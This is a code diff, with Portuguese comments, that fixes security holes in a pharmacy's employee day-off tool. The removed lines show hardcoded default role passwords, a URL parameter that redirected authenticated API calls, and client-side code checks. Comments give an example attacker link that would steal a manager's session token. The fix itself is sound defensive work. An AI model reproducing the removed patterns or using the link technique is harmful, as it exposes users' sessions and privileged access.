@@ -25,17 +25,24 @@ document.getElementById('alertDialogOk').addEventListener('click', ()=>{
 });
 
 const STORAGE_KEY = 'drogaria-center-folgas';
-const DEFAULT_ROLE_PASSWORDS = {
-  'Supervisor': '11111',
-  'Gerência': '45595',
-  'CEO': '99999'
-};
 
-let state = { employees: [], credits: [], daysOff: [], leaves: [], creditSwaps: [], blockedDates: [], blockedWeekdays: [], auditLog: [], rolePasswords: {...DEFAULT_ROLE_PASSWORDS} };
+// Não existe mais senha de papel padrão aqui. Antes este arquivo trazia
+// Supervisor/Gerência/CEO com senhas fixas — e ele é servido em /tools/ sem
+// autenticação nenhuma, então qualquer pessoa lia as senhas no código-fonte e
+// entrava na área de supervisão de qualquer organização que não as tivesse
+// trocado. Agora as senhas só existem no servidor, como hash (ver
+// backend/FolgasSigiloService), e são definidas na própria tela de gestão.
+let state = { employees: [], credits: [], daysOff: [], leaves: [], creditSwaps: [], blockedDates: [], blockedWeekdays: [], auditLog: [], rolePasswords: {} };
 let loaded = false;
 let versaoAtual = 0; // controle de concorrência otimista — ver loadState()/saveState()
 let editingEmployeeId = null;
 let currentEmployee = null;
+// Código que a pessoa digitou pra entrar, guardado só em memória e só nesta
+// sessão de tela. O servidor não devolve mais `employees[].code` (ver
+// backend/FolgasSigiloService), então este é o único lugar onde o código do
+// colaborador logado existe no cliente — usado pra provar o acesso de
+// supervisão de quem tem cargo (ver "goSupervisionBtn").
+let currentEmployeeCode = null;
 let currentRole = null; // 'Supervisor' | 'Gerência' | 'CEO'
 let currentManagerEmployee = null; // colaborador dono do cargo, quando o acesso veio do código dele (não da senha genérica)
 const CARGOS = ['Supervisor', 'Gerência', 'CEO'];
@@ -71,15 +78,31 @@ function daysBetweenInclusive(start, end){
   return Math.round(ms / 86400000) + 1;
 }
 
-// Base da API e sessão do PharmaMind — lidas do link que abriu essa ferramenta
-// (?api=...) e do localStorage da própria sessão logada (mesmo domínio do
-// front), no mesmo esquema usado pela ferramenta de Cartazes. O estado
-// (funcionários, créditos, folgas, atestados...) é salvo no backend, escopado
-// pela organização de quem estiver logado — assim gestor e funcionário, em
-// aparelhos diferentes, enxergam sempre os mesmos dados.
+// Base da API e sessão do PharmaMind — a sessão vem do localStorage da própria
+// sessão logada (mesmo domínio do front), no mesmo esquema usado pela
+// ferramenta de Cartazes. O estado (funcionários, créditos, folgas,
+// atestados...) é salvo no backend, escopado pela organização de quem estiver
+// logado — assim gestor e funcionário, em aparelhos diferentes, enxergam
+// sempre os mesmos dados.
+//
+// A base da API é SEMPRE derivada do host que serviu esta página — nunca de um
+// parâmetro da URL. Antes havia um override `?api=...`: como toda chamada daqui
+// manda o token da sessão no cabeçalho Authorization, um link do tipo
+// "...folgas-drogaria-center.html?api=https://site-do-atacante/api" fazia a
+// ferramenta entregar a sessão inteira pra quem montou o link, com um clique —
+// e getAuthToken() tenta a sessão de GESTOR primeiro, então num aparelho de
+// gestor o que vazava era o token de maior privilégio.
 function getApiBaseUrl(){
-  const fromQuery = new URLSearchParams(location.search).get('api');
-  if(fromQuery) return fromQuery;
+  // Vem da sessão salva pelo próprio app (mesmo origin), nunca da URL: era um
+  // parâmetro `?api=...`, e como toda chamada daqui manda o token no
+  // Authorization, um link com `?api=https://site-do-atacante/api` entregava a
+  // sessão inteira com um clique.
+  try{
+    for(const key of ['drogaria:session:gestor', 'drogaria:session:funcionario']){
+      const raw = localStorage.getItem(key);
+      if(raw){ const base = (JSON.parse(raw)||{}).apiBaseUrl; if(base) return base; }
+    }
+  }catch(e){ /* sem sessão salva — cai no padrão abaixo */ }
   return location.protocol + '//' + location.hostname + ':3333/api';
 }
 function getAuthToken(){
@@ -146,8 +169,35 @@ async function elevarAcesso(credencial){
   }
 }
 
+/**
+ * Confere no servidor o código digitado na entrada e devolve o colaborador
+ * correspondente ({id, name, role}) ou null.
+ *
+ * Antes isso era um `state.employees.find(e=>e.code===val)` aqui mesmo — só
+ * funcionava porque a resposta de GET vinha com o código de TODO mundo dentro,
+ * que é exatamente o que um funcionário qualquer usava pra se elevar sem saber
+ * senha nenhuma (bastava repetir id + code de um colega promovido). Agora o
+ * servidor esconde os códigos e é ele quem confere.
+ */
+async function identificarPorCodigo(codigo){
+  const token = getAuthToken();
+  if(!token) return null;
+  try{
+    const res = await fetch(getApiBaseUrl() + '/armazenamento/' + STORAGE_KEY + '/identificar', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
+      body: JSON.stringify({ codigo })
+    });
+    if(!res.ok) return null;
+    return await res.json();
+  }catch(e){
+    console.error('Erro ao identificar código', e);
+    return null;
+  }
+}
+
 function estadoPadrao(){
-  return { employees: [], credits: [], daysOff: [], leaves: [], creditSwaps: [], blockedDates: [], blockedWeekdays: [], auditLog: [], rolePasswords: {...DEFAULT_ROLE_PASSWORDS} };
+  return { employees: [], credits: [], daysOff: [], leaves: [], creditSwaps: [], blockedDates: [], blockedWeekdays: [], auditLog: [], rolePasswords: {} };
 }
 
 // Guarda por que loadState falhou (token ausente/expirado, erro de rede...) —
@@ -180,12 +230,12 @@ async function loadState(){
     // item registra também quem bloqueou — dado antigo vira "quem bloqueou: —".
     state.blockedWeekdays = state.blockedWeekdays.map(b=> typeof b === 'number' ? { weekday: b, by: null, at: null } : b);
     if(!state.auditLog) state.auditLog = [];
-    // `_acessoRestrito` (ver backend/FolgasSigiloService) avisa que rolePasswords
-    // e as notas de atestado vieram ocultas de propósito — nesse caso NÃO
-    // preenche com as senhas padrão (senão pareceria que são as senhas reais).
+    // `_acessoRestrito` (ver backend/FolgasSigiloService) avisa que rolePasswords,
+    // os códigos dos colaboradores e as notas de atestado vieram ocultos de
+    // propósito — e não "ainda não configurados".
     acessoRestrito = !!state._acessoRestrito;
     delete state._acessoRestrito;
-    if(!state.rolePasswords && !acessoRestrito) state.rolePasswords = {...DEFAULT_ROLE_PASSWORDS};
+    if(!state.rolePasswords) state.rolePasswords = {};
   }catch(e){
     console.error('Erro ao carregar', e);
     state = estadoPadrao();
